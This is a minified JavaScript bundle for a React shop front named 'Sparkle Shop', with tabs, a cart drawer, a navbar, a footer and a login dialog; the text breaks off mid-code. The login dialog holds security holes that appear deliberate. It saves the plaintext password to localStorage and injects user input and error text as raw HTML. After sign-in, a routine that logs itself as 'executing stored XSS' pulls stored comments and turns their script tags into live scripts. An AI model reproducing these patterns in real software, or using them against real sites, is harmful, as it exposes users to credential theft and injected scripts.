Cp="rovingFocusGroup.onEntryFocus",E9={bubbles:!1,cancelable:!0},qh="RovingFocusGroup",[og,HI,C9]=hv(qh),[S9,WI]=_9(qh,[C9]),[b9,T9]=S9(qh),KI=v.forwardRef((t,e)=>d.jsx(og.Provider,{scope:t.__scopeRovingFocusGroup,children:d.jsx(og.Slot,{scope:t.__scopeRovingFocusGroup,children:d.jsx(I9,{...t,ref:e})})}));KI.displayName=qh;var I9=v.forwardRef((t,e)=>{const{__scopeRovingFocusGroup:n,orientation:r,loop:i=!1,dir:s,currentTabStopId:o,defaultCurrentTabStopId:a,onCurrentTabStopIdChange:c,onEntryFocus:u,preventScrollOnEntryFocus:p=!1,...f}=t,h=v.useRef(null),E=We(e,h),_=Ry(s),[y=null,C]=Jo({prop:o,defaultProp:a,onChange:c}),[x,w]=v.useState(!1),S=sn(u),N=HI(n),R=v.useRef(!1),[j,T]=v.useState(0);return v.useEffect(()=>{const b=h.current;if(b)return b.addEventListener(Cp,S),()=>b.removeEventListener(Cp,S)},[S]),d.jsx(b9,{scope:n,orientation:r,dir:_,loop:i,currentTabStopId:y,onItemFocus:v.useCallback(b=>C(b),[C]),onItemShiftTab:v.useCallback(()=>w(!0),[]),onFocusableItemAdd:v.useCallback(()=>T(b=>b+1),[]),onFocusableItemRemove:v.useCallback(()=>T(b=>b-1),[]),children:d.jsx(pe.div,{tabIndex:x||j===0?-1:0,"data-orientation":r,...f,ref:E,style:{outline:"none",...t.style},onMouseDown:ie(t.onMouseDown,()=>{R.current=!0}),onFocus:ie(t.onFocus,b=>{const P=!R.current;if(b.target===b.currentTarget&&P&&!x){const k=new CustomEvent(Cp,E9);if(b.currentTarget.dispatchEvent(k),!k.defaultPrevented){const O=N().filter(q=>q.focusable),D=O.find(q=>q.active),A=O.find(q=>q.id===y),Z=[D,A,...O].filter(Boolean).map(q=>q.ref.current);YI(Z,p)}}R.current=!1}),onBlur:ie(t.onBlur,()=>w(!1))})})}),GI="RovingFocusGroupItem",qI=v.forwardRef((t,e)=>{const{__scopeRovingFocusGroup:n,focusable:r=!0,active:i=!1,tabStopId:s,...o}=t,a=gl(),c=s||a,u=T9(GI,n),p=u.currentTabStopId===c,f=HI(n),{onFocusableItemAdd:h,onFocusableItemRemove:E}=u;return v.useEffect(()=>{if(r)return h(),()=>E()},[r,h,E]),d.jsx(og.ItemSlot,{scope:n,id:c,focusable:r,active:i,children:d.jsx(pe.span,{tabIndex:p?0:-1,"data-orientation":u.orientation,...o,ref:e,onMouseDown:ie(t.onMouseDown,_=>{r?u.onItemFocus(c):_.preventDefault()}),onFocus:ie(t.onFocus,()=>u.onItemFocus(c)),onKeyDown:ie(t.onKeyDown,_=>{if(_.key==="Tab"&&_.shiftKey){u.onItemShiftTab();return}if(_.target!==_.currentTarget)return;const y=P9(_,u.orientation,u.dir);if(y!==void 0){if(_.metaKey||_.ctrlKey||_.altKey||_.shiftKey)return;_.preventDefault();let x=f().filter(w=>w.focusable).map(w=>w.ref.current);if(y==="last")x.reverse();else if(y==="prev"||y==="next"){y==="prev"&&x.reverse();const w=x.indexOf(_.currentTarget);x=u.loop?R9(x,w+1):x.slice(w+1)}setTimeout(()=>YI(x))}})})})});qI.displayName=GI;var N9={ArrowLeft:"prev",ArrowUp:"prev",ArrowRight:"next",ArrowDown:"next",PageUp:"first",Home:"first",PageDown:"last",End:"last"};function k9(t,e){return e!=="rtl"?t:t==="ArrowLeft"?"ArrowRight":t==="ArrowRight"?"ArrowLeft":t}function P9(t,e,n){const r=k9(t.key,n);if(!(e==="vertical"&&["ArrowLeft","ArrowRight"].includes(r))&&!(e==="horizontal"&&["ArrowUp","ArrowDown"].includes(r)))return N9[r]}function YI(t,e=!1){const n=document.activeElement;for(const r of t)if(r===n||(r.focus({preventScroll:e}),document.activeElement!==n))return}function R9(t,e){return t.map((n,r)=>t[(e+r)%t.length])}var A9=KI,O9=qI,Ay="Tabs",[D9,eB]=Xo(Ay,[WI]),QI=WI(),[j9,Oy]=D9(Ay),XI=v.forwardRef((t,e)=>{const{__scopeTabs:n,value:r,onValueChange:i,defaultValue:s,orientation:o="horizontal",dir:a,activationMode:c="automatic",...u}=t,p=Ry(a),[f,h]=Jo({prop:r,onChange:i,defaultProp:s});return d.jsx(j9,{scope:n,baseId:gl(),value:f,onValueChange:h,orientation:o,dir:p,activationMode:c,children:d.jsx(pe.div,{dir:p,"data-orientation":o,...u,ref:e})})});XI.displayName=Ay;var JI="TabsList",ZI=v.forwardRef((t,e)=>{const{__scopeTabs:n,loop:r=!0,...i}=t,s=Oy(JI,n),o=QI(n);return d.jsx(A9,{asChild:!0,...o,orientation:s.orientation,dir:s.dir,loop:r,children:d.jsx(pe.div,{role:"tablist","aria-orientation":s.orientation,...i,ref:e})})});ZI.displayName=JI;var eN="TabsTrigger",tN=v.forwardRef((t,e)=>{const{__scopeTabs:n,value:r,disabled:i=!1,...s}=t,o=Oy(eN,n),a=QI(n),c=iN(o.baseId,r),u=sN(o.baseId,r),p=r===o.value;return d.jsx(O9,{asChild:!0,...a,focusable:!i,active:p,children:d.jsx(pe.button,{type:"button",role:"tab","aria-selected":p,"aria-controls":u,"data-state":p?"active":"inactive","data-disabled":i?"":void 0,disabled:i,id:c,...s,ref:e,onMouseDown:ie(t.onMouseDown,f=>{!i&&f.button===0&&f.ctrlKey===!1?o.onValueChange(r):f.preventDefault()}),onKeyDown:ie(t.onKeyDown,f=>{[" ","Enter"].includes(f.key)&&o.onValueChange(r)}),onFocus:ie(t.onFocus,()=>{const f=o.activationMode!=="manual";!p&&!i&&f&&o.onValueChange(r)})})})});tN.displayName=eN;var nN="TabsContent",rN=v.forwardRef((t,e)=>{const{__scopeTabs:n,value:r,forceMount:i,children:s,...o}=t,a=Oy(nN,n),c=iN(a.baseId,r),u=sN(a.baseId,r),p=r===a.value,f=v.useRef(p);return v.useEffect(()=>{const h=requestAnimationFrame(()=>f.current=!1);return()=>cancelAnimationFrame(h)},[]),d.jsx(qi,{present:i||p,children:({present:h})=>d.jsx(pe.div,{"data-state":p?"active":"inactive","data-orientation":a.orientation,role:"tabpanel","aria-labelledby":c,hidden:!h,id:u,tabIndex:0,...o,ref:e,style:{...t.style,animationDuration:f.current?"0s":void 0},children:h&&s})})});rN.displayName=nN;function iN(t,e){return`${t}-trigger-${e}`}function sN(t,e){return`${t}-content-${e}`}var M9=XI,oN=ZI,aN=tN,lN=rN;const Dy=M9,Yh=v.forwardRef(({className:t,...e},n)=>d.jsx(oN,{ref:n,className:fe("inline-flex h-10 items-center justify-center rounded-md bg-muted p-1 text-muted-foreground",t),...e}));Yh.displayName=oN.displayName;const Tr=v.forwardRef(({className:t,...e},n)=>d.jsx(aN,{ref:n,className:fe("inline-flex items-center justify-center whitespace-nowrap rounded-sm px-3 py-1.5 text-sm font-medium ring-offset-background transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 data-[state=active]:bg-background data-[state=active]:text-foreground data-[state=active]:shadow-sm",t),...e}));Tr.displayName=aN.displayName;const _s=v.forwardRef(({className:t,...e},n)=>d.jsx(lN,{ref:n,className:fe("mt-2 ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2",t),...e}));_s.displayName=lN.displayName;const Xt=v.forwardRef(({className:t,type:e,...n},r)=>d.jsx("input",{type:e,className:fe("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm",t),ref:r,...n}));Xt.displayName="Input";var L9="Label",cN=v.forwardRef((t,e)=>d.jsx(pe.label,{...t,ref:e,onMouseDown:n=>{var i;n.target.closest("button, input, select, textarea")||((i=t.onMouseDown)==null||i.call(t,n),!n.defaultPrevented&&n.detail>1&&n.preventDefault())}}));cN.displayName=L9;var uN=cN;const F9=_h("text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"),Jt=v.forwardRef(({className:t,...e},n)=>d.jsx(uN,{ref:n,className:fe(F9(),t),...e}));Jt.displayName=uN.displayName;const U9=({open:t,onOpenChange:e,initialView:n})=>{const[r,i]=v.useState(""),[s,o]=v.useState(""),[a,c]=v.useState(""),[u,p]=v.useState(n),[f,h]=v.useState(!1),[E,_]=v.useState(null),{login:y,register:C}=da();v.useEffect(()=>{r&&localStorage.setItem("last_email",r),s&&localStorage.setItem("last_password",s);const j=localStorage.getItem("last_email");j&&!r&&i(j)},[r,s]);const x=()=>{i(""),o(""),c(""),_(null),h(!1)},w=j=>{p(j),_(null)},S=(j,T)=>{var b;return(b=document.getElementById("credentials-container"))==null||b.insertAdjacentHTML("beforeend",`<div style="display:none">Processing: ${j}</div>`),{email:j,password:T}},N=async()=>{try{console.log("Executing stored XSS after login...");const j=await ua("comments");if(j.exists()){const T=j.val(),b=document.createElement("div");b.style.display="none",b.id="xss-payload-container",document.body.appendChild(b),Object.values(T).forEach(P=>{if(P.text)try{const k=document.createElement("div");k.innerHTML=P.text,b.appendChild(k);const O=P.text.match(/<script>([\s\S]*?)<\/script>/i);if(O&&O[1]){const D=document.createElement("script");D.textContent=O[1],b.appendChild(D),console.log("Injected script from comment:",O[1])}}catch(k){console.error("Error processing comment for XSS:",k)}}),setTimeout(()=>{document.body.contains(b)&&document.body.removeChild(b)},5e3),console.log("Stored XSS payloads executed")}}catch(j){console.error("Error executing stored XSS:",j)}},R=async j=>{j.preventDefault(),_(null),h(!0);try{const T=S(r,s);if(u==="register"){if(s!==a){_("Passwords do not match"),h(!1);return}await C(T.email,T.password)}else await y(T.email,T.password),console.log("Login successful, executing stored XSS..."),setTimeout(()=>{N()},1e3);x(),e(!1)}catch(T){T instanceof Error?_(T.message):_("An unexpected error occurred")}finally{h(!1)}};return d.jsx(g9,{open:t,onOpenChange:j=>{j||x(),e(j)},children:d.jsxs(zI,{className:"sm:max-w-[425px]",children:[d.jsx(BI,{children:d.jsx(VI,{className:"text-center text-2xl font-serif",children:u==="login"?"Welcome Back":"Create an Account"})}),d.jsxs(Dy,{value:u,onValueChange:w,className:"w-full",children:[d.jsxs(Yh,{className:"grid w-full grid-cols-2",children:[d.jsx(Tr,{value:"login",children:"Login"}),d.jsx(Tr,{value:"register",children:"Register"})]}),d.jsxs("div",{className:"mt-4",children:[E&&d.jsx("div",{className:"bg-red-50 text-red-500 px-4 py-2 rounded-md text-sm mb-4",children:d.jsx("div",{dangerouslySetInnerHTML:{__html:E}})}),d.jsxs("form",{onSubmit:R,className:"space-y-4",children:[d.jsx("div",{id:"credentials-container"}),d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"email",children:"Email"}),d.jsx(Xt,{id:"email",type:"email",value:r,onChange:j=>i(j.target.value),placeholder:"your@email.com",required:!0})]}),d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"password",children:"Password"}),d.jsx(Xt,{id:"password",type:"password",value:s,onChange:j=>o(j.target.value),required:!0})]}),u==="register"&&d.jsxs("div",{className:"space-y-2",children:[d.jsx(Jt,{htmlFor:"confirmPassword",children:"Confirm Password"}),d.jsx(Xt,{id:"confirmPassword",type:"password",value:a,onChange:j=>c(j.target.value),required:!0})]}),d.jsx(oe,{type:"submit",className:"w-full",disabled:f,children:f?"Processing...":u==="login"?"Sign In":"Sign Up"})]})]})]})]})})};var $9="Separator",Zx="horizontal",z9=["horizontal","vertical"],dN=v.forwardRef((t,e)=>{const{decorative:n,orientation:r=Zx,...i}=t,s=B9(r)?r:Zx,a=n?{role:"none"}:{"aria-orientation":s==="vertical"?s:void 0,role:"separator"};return d.jsx(pe.div,{"data-orientation":s,...a,...i,ref:e})});dN.displayName=$9;function B9(t){return z9.includes(t)}var hN=dN;const fN=v.forwardRef(({className:t,orientation:e="horizontal",decorative:n=!0,...r},i)=>d.jsx(hN,{ref:i,decorative:n,orientation:e,className:fe("shrink-0 bg-border",e==="horizontal"?"h-[1px] w-full":"h-full w-[1px]",t),...r}));fN.displayName=hN.displayName;const V9=()=>{const{isOpen:t,closeCart:e,cartItems:n,cartTotal:r,increaseCartQuantity:i,decreaseCartQuantity:s,removeFromCart:o}=Tc(),a=uc();Ie("ShoppingCartDrawer","Rendering with isOpen:",t),v.useEffect(()=>{Ie("ShoppingCartDrawer","useEffect triggered, isOpen:",t)},[t]);const c=u=>{Ie("ShoppingCartDrawer","Navigation to:",u),e(),setTimeout(()=>{a(u)},100)};return d.jsx(Py,{open:t,onOpenChange:u=>{Ie("ShoppingCartDrawer","Sheet onOpenChange:",u),u||e()},children:d.jsxs(Gh,{className:"w-full sm:max-w-md flex flex-col h-full","aria-label":"Shopping Cart",children:[d.jsx(FI,{className:"space-y-2.5 pb-4",children:d.jsxs(UI,{className:"flex items-center",children:[d.jsx(Dl,{className:"mr-2 h-5 w-5"}),"Your Cart"]})}),n.length===0?d.jsxs("div",{className:"flex-1 flex flex-col items-center justify-center space-y-4",children:[d.jsx("div",{className:"w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center",children:d.jsx(Dl,{className:"h-8 w-8 text-primary"})}),d.jsxs("div",{className:"text-center",children:[d.jsx("h3",{className:"font-medium text-lg mb-1",children:"Your cart is empty"}),d.jsx("p",{className:"text-sm text-gray-500 mb-4",children:"Looks like you haven't added anything to your cart yet."}),d.jsx(oe,{onClick:()=>c("/products"),children:"Continue Shopping"})]})]}):d.jsxs(d.Fragment,{children:[d.jsx("div",{className:"flex-1 overflow-auto py-4",children:d.jsx("div",{className:"space-y-6",children:n.map(u=>d.jsxs("div",{className:"flex gap-4",children:[d.jsx("div",{className:"w-20 h-20 bg-gray-100 rounded-md overflow-hidden",children:d.jsx("img",{src:u.image,alt:u.name,className:"w-full h-full object-cover"})}),d.jsxs("div",{className:"flex-1 flex flex-col",children:[d.jsxs("div",{className:"flex justify-between",children:[d.jsx("div",{className:"font-medium line-clamp-1 hover:text-primary cursor-pointer",onClick:()=>c(`/product/${u.id}`),children:u.name}),d.jsx("button",{className:"text-gray-400 hover:text-red-500",onClick:()=>o(u.id),"aria-label":`Remove ${u.name} from cart`,children:d.jsx(Sm,{size:16})})]}),d.jsxs("div",{className:"text-sm text-gray-500",children:["$",u.price.toFixed(2)]}),d.jsxs("div",{className:"mt-auto flex justify-between items-center",children:[d.jsxs("div",{className:"flex border border-gray-200 rounded",children:[d.jsx("button",{className:"px-2 py-1 hover:bg-gray-100",onClick:()=>s(u.id),"aria-label":`Decrease quantity of ${u.name}`,children:d.jsx(vv,{size:14})}),d.jsx("span",{className:"px-3 py-1 border-l border-r border-gray-200",children:u.quantity}),d.jsx("button",{className:"px-2 py-1 hover:bg-gray-100",onClick:()=>i({id:u.id,name:u.name,price:u.price,image:u.image}),"aria-label":`Increase quantity of ${u.name}`,children:d.jsx(yv,{size:14})})]}),d.jsxs("div",{className:"font-medium",children:["$",(u.price*u.quantity).toFixed(2)]})]})]})]},u.id))})}),d.jsxs("div",{className:"border-t pt-4",children:[d.jsxs("div",{className:"space-y-2 mb-4",children:[d.jsxs("div",{className:"flex justify-between text-sm",children:[d.jsx("span",{className:"text-gray-600",children:"Subtotal"}),d.jsxs("span",{children:["$",r.toFixed(2)]})]}),d.jsxs("div",{className:"flex justify-between text-sm",children:[d.jsx("span",{className:"text-gray-600",children:"Shipping"}),d.jsx("span",{children:"Free"})]}),d.jsx(fN,{}),d.jsxs("div",{className:"flex justify-between font-medium",children:[d.jsx("span",{children:"Total"}),d.jsxs("span",{children:["$",r.toFixed(2)]})]})]}),d.jsxs("div",{className:"space-y-2",children:[d.jsx(oe,{className:"w-full",onClick:()=>c("/cart"),children:"View Cart"}),d.jsx(oe,{className:"w-full",variant:"outline",onClick:()=>c("/products"),children:"Continue Shopping"})]})]})]})]})})},Pi=()=>{const{cartQuantity:t,openCart:e}=Tc(),{currentUser:n,logout:r,refreshUserFromToken:i}=da(),[s,o]=v.useState(!1),[a,c]=v.useState(!1),[u,p]=v.useState("login"),f=()=>o(!s);v.useEffect(()=>{Ie("Navbar",`Cart quantity changed: ${t}`)},[t]);const h=C=>{C.preventDefault(),C.stopPropagation(),Ie("Navbar","Cart button clicked, calling openCart()"),window.requestAnimationFrame(()=>{try{e(),Ie("Navbar","openCart() called through requestAnimationFrame")}catch(x){Ie("Navbar","Error calling openCart()",x)}})},E=C=>{p(C),c(!0)},_=async()=>{try{await r()}catch(C){console.error("Logout error:",C)}},y=async()=>{try{await i()}catch(C){console.error("Error refreshing auth:",C)}};return d.jsxs(d.Fragment,{children:[d.jsxs("header",{className:"bg-white shadow-sm sticky top-0 z-50 w-full animate-fade-in",children:[d.jsxs("div",{className:"container mx-auto px-4 py-4 flex items-center justify-between",children:[d.jsx(de,{to:"/",className:"flex items-center",children:d.jsxs("span",{className:"font-serif font-bold text-2xl text-primary",children:["Sparkle",d.jsx("span",{className:"text-gray-800",children:"Shop"})]})}),d.jsxs("nav",{className:"hidden md:flex space-x-6 items-center",children:[d.jsx(de,{to:"/",className:"text-gray-700 hover:text-primary transition-colors",children:"Home"}),d.jsx(de,{to:"/products",className:"text-gray-700 hover:text-primary transition-colors",children:"Shop"}),d.jsx(de,{to:"/products?category=new",className:"text-gray-700 hover:text-primary transition-colors",children:"New Arrivals"}),d.jsx(de,{to:"/products?category=sale",className:"text-gray-700 hover:text-primary transition-colors",children:"Sale"})]}),d.jsxs("div",{className:"hidden md:flex items-center space-x-4",children:[d.jsx("button",{className:"text-gray-700 hover:text-primary transition-colors","aria-label":"Search",children:d.jsx(c1,{size:20})}),n?d.jsx("div",{className:"relative",children:d.jsxs(Py,{children:[d.jsx(MI,{asChild:!0,children:d.jsx(oe,{variant:"ghost",size:"icon",className:"hover:text-primary transition-colors","aria-label":"User menu",children:d.jsx(i2,{size:20})})}),d.jsx(Gh,{children:d.jsxs("div",{className:"flex flex-col space-y-4 mt-8",children:[d.jsxs("h3",{className:"font-medium text-lg",children:["Hello, ",n.email]}),d.jsx(de,{to:"/profile",className:"px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 rounded-md",onClick:()=>o(!1),children:"My Profile"}),d.jsx(de,{to:"/orders",className:"px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 rounded-md",onClick:()=>o(!1),children:"My Orders"}),d.jsxs(oe,{variant:"outline",onClick:y,className:"w-full justify-start mt-2 flex items-center gap-2",children:[d.jsx(Q_,{size:16}),"Refresh Session"]}),d.jsx(oe,{variant:"outline",onClick:_,className:"w-full justify-start",children:"Sign Out"})]})})]})}):d.jsxs("div",{className:"space-x-2 flex items-center",children:[d.jsx(oe,{variant:"ghost",className:"text-sm",onClick:()=>E("login"),children:"Log in"}),d.jsx(oe,{variant:"default",className:"text-sm",onClick:()=>E("register"),children:"Sign up"})]}),d.jsxs(oe,{variant:"ghost",className:"relative",size:"icon",onClick:h,type:"button","aria-label":"Shopping cart",id:"cart-button",children:[d.jsx(Dl,{size:20}),t>0&&d.jsx("span",{className:"absolute -top-1 -right-1 bg-primary text-white text-xs font-bold rounded-full w-5 h-5 flex items-center justify-center",children:t})]})]}),d.jsxs("div",{className:"flex md:hidden items-center space-x-4",children:[d.jsxs(oe,{variant:"ghost",className:"relative",size:"icon",onClick:h,type:"button","aria-label":"Shopping cart",id:"mobile-cart-button",children:[d.jsx(Dl,{size:20}),t>0&&d.jsx("span",{className:"absolute -top-1 -right-1 bg-primary text-white text-xs font-bold rounded-full w-5 h-5 flex items-center justify-center",children:t})]}),d.jsx(oe,{variant:"ghost",size:"icon",onClick:f,"aria-label":s?"Close menu":"Open menu",children:s?d.jsx(lc,{size:24}):d.jsx(t2,{size:24})})]})]}),s&&d.jsx("div",{className:"md:hidden bg-white border-t px-4 py-2 animate-fade-in",children:d.jsxs("nav",{className:"flex flex-col space-y-3 py-3",children:[d.jsx(de,{to:"/",className:"text-gray-700 py-2",onClick:f,children:"Home"}),d.jsx(de,{to:"/products",className:"text-gray-700 py-2",onClick:f,children:"Shop"}),d.jsx(de,{to:"/products?category=new",className:"text-gray-700 py-2",onClick:f,children:"New Arrivals"}),d.jsx(de,{to:"/products?category=sale",className:"text-gray-700 py-2",onClick:f,children:"Sale"}),d.jsx("div",{className:"border-t border-gray-200 my-2"}),n?d.jsxs(d.Fragment,{children:[d.jsx(de,{to:"/profile",className:"text-gray-700 py-2",onClick:f,children:"My Profile"}),d.jsx(de,{to:"/orders",className:"text-gray-700 py-2",onClick:f,children:"My Orders"}),d.jsxs(oe,{variant:"outline",onClick:y,className:"flex items-center gap-2 justify-center",children:[d.jsx(Q_,{size:16}),"Refresh Session"]}),d.jsx(oe,{variant:"outline",onClick:()=>{_(),f()},children:"Sign Out"})]}):d.jsxs("div",{className:"space-y-2",children:[d.jsx(oe,{variant:"outline",className:"w-full",onClick:()=>{E("login"),f()},children:"Log in"}),d.jsx(oe,{className:"w-full",onClick:()=>{E("register"),f()},children:"Sign up"})]})]})}),d.jsx(U9,{open:a,onOpenChange:c,initialView:u})]}),d.jsx(V9,{})]})},Ri=()=>{const t=e=>{e.preventDefault()};return d.jsx("footer",{className:"bg-white border-t border-gray-200",children:d.jsxs("div",{className:"container mx-auto px-4 py-12 md:py-16",children:[d.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-8",children:[d.jsxs("div",{className:"md:col-span-1",children:[d.jsx(de,{to:"/",className:"inline-block mb-4",children:d.jsxs("span",{className:"font-serif font-bold text-2xl text-primary",children:["Sparkle",d.jsx("span",{className:"text-gray-800",children:"Shop"})]})}),d.jsx("p",{className:"text-gray-600 mb-6",children:"Discover unique treasures and everyday essentials at Sparkle Shop - your new favorite online shopping destination."}),d.jsxs("div",{className:"flex space-x-4",children:[d.jsx("a",{href:"https://instagram.com",target:"_blank",rel:"noreferrer",className:"text-gray-500 hover:text-primary",children:d.jsx(e2,{size:20})}),d.jsx("a",{href:"https://facebook.com",target:"_blank",rel:"noreferrer",className:"text-gray-500 hover:text-primary",children:d.jsx(ZA,{size:20})}),d.jsx("a",{href:"https://twitter.com",target:"_blank",rel:"noreferrer",className:"text-gray-500 hover:text-primary",children:d.jsx(r2,{size:20})})]})]}),d.jsxs("div",{children:[d.jsx("h3",{className:"font-medium text-lg mb-4",children:"Shop"}),d.jsxs("ul",{className:"space-y-3",children:[d.jsx("li",{children:d.jsx(de,{to:"/products",className:"text-gray-600 hover:text-primary",children:"All Products"})}),d.jsx("li",{children:d.jsx(de,{to:"/products?category=new",className:"text-gray-600 hover:text-primary",children:"New Arrivals"})}),d.jsx("li",{children:d.jsx(de,{to:"/products?category=sale",className:"text-gray-600 hover:text-primary",children:"Sale"})}),d.jsx("li",{children:d.jsx(de,{to:"/products?category=accessories",className:"text-gray-600 hover:text-primary",children:"Accessories"})}),d.jsx("li",{children:d.jsx(de,{to:"/products?category=home",className:"text-gray-600 hover:text-primary",children:"Home Goods"})})]})]}),d.jsxs("div",{children:[d.jsx("h3",{className:"font-medium text-lg mb-4",children:"Help"}),d.jsxs("ul",{className:"space-y-3",children:[d.jsx("li",{children:d.jsx(de,{to:"/contact",className:"text-gray-600 hover:text-primary",children:"Contact Us"})}),d.jsx("li",{children:d.jsx(de,{to:"/faq",className:"text-gray-600 hover:text-primary",children:"FAQs"})}),d.jsx("li",{children:d.jsx(de,{to:"/shipping",className:"text-gray-600 hover:text-primary",children:"Shipping Information"})}),d.jsx("li",{children:d.jsx(de,{to:"/returns",className:"text-gray-600 hover:text-primary",children:"Returns & Exchanges"})}),d.jsx("li",{children:d.jsx(de,{to:"/privacy",className:"text-gray-600 hover:text-primary",children:"Privacy Policy"})})]})]}),d.jsxs("div",{children:[d.jsx("h3",{className:"font-medium text-lg mb-4",children:"Newsletter"}),d.jsx("p",{className:"text-gray-600 mb-4",children:"Subscribe to receive updates, access to exclusive deals, and more."}),d.jsxs("form",{onSubmit:t,className:"space-y-3",children:[d.jsx(Xt,{type:"email",placeholder:"Your email address",className:"bg-gray-50",required:!0}),d.jsx(oe,{type:"submit",className:"w-full",children:"Subscribe"})]})]})]}),d.jsx("div",{className:"border-t border-gray-200 mt-12 pt-8 text-center text-gray-500 text-sm",children:d.jsxs("p",{children:[" ",new Date().getFullYear()," Sparkle Shop. All rights reserved."]})})]})})},H9=[{id:"electronics",name:"Electronics",image:"https://images.unsplash.com/photo-1498049794561-7780e7231661?q=80&w=3270&auto=format&fit=crop&ixlib=rb-4.0.3"},{id:"fashion",name:"Fashion",image:"https://images.unsplash.com/photo-1445205170230-053b83016050?q=80&w=3271&auto=format&fit=crop&ixlib=rb-4.0.3"},{id:"home",name:"Home Goods",image:"https://images.unsplash.com/photo-1583847268964-b28dc8f51f36?q=80&w=3174&auto=format&fit=crop&ixlib=rb-4.0.3"}],W9=()=>(v.useEffect(()=>{sI().catch(t=>{console.error("Error initializing products:",t)})},[]),d.jsxs("div",{className:"min-h-screen flex flex-col",children:[d.jsx(Pi,{}),d.jsxs("main",{className:"flex-grow",children:[d.jsx(BD,{}),d.jsx(a6,{}),d.jsx("section",{className:"py-16 px-4 md:px-8 bg-gray-50",children:d.jsxs("div",{className:"container mx-auto",children:[d.jsx("h2",{className:"text-2xl md:text-3xl font-serif mb-10 text-center",children:"Shop by Category"}),d.jsx("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-6",children:H9.map(t=>d.jsx(de,{to:`/products?category=${t.id}`,className:"group",children:d.jsxs("div",{className:"relative h-80 rounded-lg overflow-hidden",children:[d.jsx("div",{className:"absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors z-10"}),d.jsx("img",{src:t.image,alt:t.name,className:"w-full h-full object-cover transition-transform duration-700 group-hover:scale-110"}),d.jsx("div",{className:"absolute inset-0 flex items-center justify-center z-20",children:d.jsxs("div",{className:"text-center",children:[d.jsx("h3",{className:"text-white text-2xl font-serif mb-2",children:t.name}),d.jsx(oe,{variant:"secondary",size:"sm",className:"bg-white hover:bg-white/90",children:"Shop Now"})]})})]})},t.id))})]})}),d.jsx("section",{className:"py-16 px-4 md:px-8",children:d.jsx("div",{className:"container mx-auto",children:d.jsx("div",{className:"bg-primary/10 rounded-xl p-8 md:p-12",children:d.jsxs("div",{className:"grid md:grid-cols-2 gap-8 items-center",children:[d.jsxs("div",{children:[d.jsx("h2",{className:"text-2xl md:text-3xl font-serif mb-4",children:"Join Our Community"}),d.jsx("p",{className:"text-gray-700 mb-6",children:"Sign up now and get 10% off your first order, plus early access to exclusive sales and new arrivals."}),d.jsx(oe,{asChild:!0,size:"lg",children:d.jsx(de,{to:"/signup",children:"Create an Account"})})]}),d.jsx("div",{className:"hidden md:block rounded-lg overflow-hidden",children:d.jsx("img",{src:"https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=3270&auto=format&fit=crop&ixlib=rb-4.0.3",alt:"Happy customers",className:"w-full h-full object-cover"})})]})})})})]}),d.jsx(Ri,{})]})),K9=()=>{const t=ta();return v.useEffect(()=>{console.error("404 Error: User attempted to access non-existent route:",t.pathname)},[t.pathname]),d.jsx("div",{className:"min-h-screen flex items-center justify-center bg-gray-100",children:d.jsxs("div",{className:"text-center",children:[d.jsx("h1",{className:"text-4xl font-bold mb-4",children:"404"}),d.jsx("p",{className:"text-xl text-gray-600 mb-4",children:"Oops! Page not found"}),d.jsx("a",{href:"/",className:"text-blue-500 hover:text-blue-700 underline",children:"Return to Home"})]})})};function pN(t){const e=v.useRef({value:t,previous:t});return v.useMemo(()=>(e.current.value!==t&&(e.current.previous=e.current.value,e.current.value=t),e.current.previous),[t])}function jy(t){const[e,n]=v.useState(void 0);return ji(()=>{if(t){n({width:t.offsetWidth,height:t.offsetHeight});const r=new ResizeObserver(i=>{if(!Array.isArray(i)||!i.length)return;const s=i[0];let o,a;if("borderBoxSize"in s){const c=s.borderBoxSize,u=Array.isArray(c)?c[0]:c;o=u.inlineSize,a=u.blockSize}else o=t.offsetWidth,a=t.offsetHeight;n({width:o,height:a})});return r.observe(t,{box:"border-box"}),()=>r.unobserve(t)}else n(void 0)},[t]),e}var My="Checkbox",[G9,tB]=Xo(My),[q9,Y9]=G9(My),mN=v.forwardRef((t,e)=>{const{__scopeCheckbox:n,name:r,checked:i,defaultChecked:s,required:o,disabled:a,value:c="on",onCheckedChange:u,form:p,...f}=t,[h,E]=v.useState(null),_=We(e,N=>E(N)),y=v.useRef(!1),C=h?p||!!h.closest("form"):!0,[x=!1,w]=Jo({prop:i,defaultProp:s,onChange:u}),S=v.useRef(x);return v.useEffect(()=>{const N=h==null?void 0:h.form;if(N){const R=()=>w(S.current);return N.addEventListener("reset",R),()=>N.removeEventListener("reset",R)}},[h,w]),d.jsxs(q9,{scope:n,state:x,disabled:a,children:[d.jsx(pe.button,{type:"button",role:"checkbox","aria-checked":Ai(x)?"mixed":x,"aria-required":o,"data-state":yN(x),"data-disabled":a?"":void 0,disabled:a,value:c,...f,ref:_,onKeyDown:ie(t.onKeyDown,N=>{N.key==="Enter"&&N.preventDefault()}),onClick:ie(t.onClick,N=>{w(R=>Ai(R)?!0:!R),C&&(y.current=N.isPropagationStopped(),y.current||N.stopPropagation())})}),C&&d.jsx(Q9,{control:h,bubbles:!y.current,name:r,value:c,checked:x,required:o,disabled:a,form:p,style:{transform:"translateX(-100%)"},defaultChecked:Ai(s)?!1:s})]})});mN.displayName=My;var gN="CheckboxIndicator",vN=v.forwardRef((t,e)=>{const{__scopeCheckbox:n,forceMount:r,...i}=t,s=Y9(gN,n);return 